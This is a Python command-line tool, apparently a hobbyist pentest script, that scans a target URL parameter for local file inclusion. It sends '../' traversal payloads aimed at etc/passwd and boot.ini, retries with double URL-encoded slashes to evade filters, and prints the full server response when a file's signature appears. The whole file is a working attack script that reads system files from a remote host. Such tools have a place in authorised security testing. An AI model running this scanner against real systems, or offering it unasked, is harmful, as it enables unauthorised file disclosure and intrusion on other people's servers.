import optparse

import requests
from termcolor import colored

TIMEOUT = 10

# payload -> signature that only appears in the response if the file was read
PAYLOADS = {
    "etc/passwd": "root:",
    "boot.ini": "[boot loader]",
}


def banner():
    print(colored('''
    _     _____ ___
    | |   |  ___|_ _|___ _ __
    | |   | |_   | |/ _ \\ '__|
    | |___|  _|  | |  __/ |
    |_____|_|   |___\\___|_|
    by Mohamed Sayed @kanike99
    ''', 'green'))


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option('-u', '--url', dest='url',
                      help='Target URL, e.g. http://site/showimage.php')
    parser.add_option('-p', '--parameter', dest='parameter',
                      help='Vulnerable parameter to fuzz, e.g. file')
    parser.add_option('-d', '--depth', dest='depth', type='int', default=6,
                      help='Max number of ../ traversal levels to try (default: 6)')
    (options, _) = parser.parse_args()

    if not options.url:
        parser.error(colored("[-] Please provide a target URL, use --help for more information", 'red'))
    if not options.parameter:
        parser.error(colored("[-] Please provide a parameter to attack, use --help for more information", 'red'))

    return options


def send(url, parameter, payload):
    try:
        return requests.get(url, params={parameter: payload}, timeout=TIMEOUT)
    except requests.RequestException as error:
        print(colored(f"[-] Request failed ({payload}): {error}", 'red'))
        return None


def report(response, payload):
    print(colored("Vulnerable!!!", "red", attrs=['bold']))
    print(colored(f"{response.url}", "blue"))
    print(colored(f"payload --> {payload}", "blue"))
    print(response.text)


def attack():
    args = get_arguments()
    up = "../"
    found = False

    for payload, signature in PAYLOADS.items():
        for level in range(0, args.depth):
            traversal = level * up + payload

            response = send(args.url, args.parameter, traversal)
            if response is not None and signature in response.text:
                report(response, traversal)
                found = True
                continue

            # retry with double URL-encoded slashes to bypass naive filters
            encoded = traversal.replace("/", "%252f")
            response = send(args.url, args.parameter, encoded)
            if response is not None and signature in response.text:
                report(response, encoded)
                found = True

    if not found:
        print(colored("[-] No LFI detected with the built-in payloads.", "yellow"))


if __name__ == "__main__":
    banner()
    attack()
